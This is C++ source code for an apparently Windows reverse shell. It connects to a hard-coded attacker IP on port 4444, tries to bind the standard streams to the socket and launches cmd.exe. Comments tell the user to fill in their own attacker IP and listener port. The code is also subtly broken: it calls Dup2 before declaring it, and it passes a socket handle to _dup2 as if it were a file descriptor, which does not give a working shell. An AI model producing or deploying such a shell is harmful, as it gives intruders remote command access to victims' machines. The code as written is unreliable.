#include <iostream>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

void main() {
    WSADATA wsa;
    SOCKET client_socket;
    struct sockaddr_in server_addr;
    char *server_ip = "10.0.1.35";  // Replace with your attacker's IP
    int server_port = 4444;  // Replace with the listener port

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        std::cout << "WSAStartup failed. Error: " << WSAGetLastError() << std::endl;
        return;
    }

    // Create socket
    if ((client_socket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        std::cout << "Socket creation failed. Error: " << WSAGetLastError() << std::endl;
        return;
    }

    // Set up the server address structure
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(server_ip);
    server_addr.sin_port = htons(server_port);

    // Connect to the listener
    if (connect(client_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        std::cout << "Connection failed. Error: " << WSAGetLastError() << std::endl;
        return;
    }

    // Redirect stdin, stdout, and stderr to the socket
    Dup2(client_socket, 0);  // stdin
    Dup2(client_socket, 1);  // stdout
    Dup2(client_socket, 2);  // stderr

    // Start a shell
    system("cmd.exe");

    closesocket(client_socket);
    WSACleanup();
}

void Dup2(SOCKET socket, int fd) {
    HANDLE handle = (HANDLE)_get_osfhandle(fd);
    SOCKET new_socket = socket;
    int socket_handle = (int)new_socket;

    if (fd == 0) {
        _dup2(socket_handle, _fileno(stdin));
    } else if (fd == 1) {
        _dup2(socket_handle, _fileno(stdout));
    } else if (fd == 2) {
        _dup2(socket_handle, _fileno(stderr));
    }
}
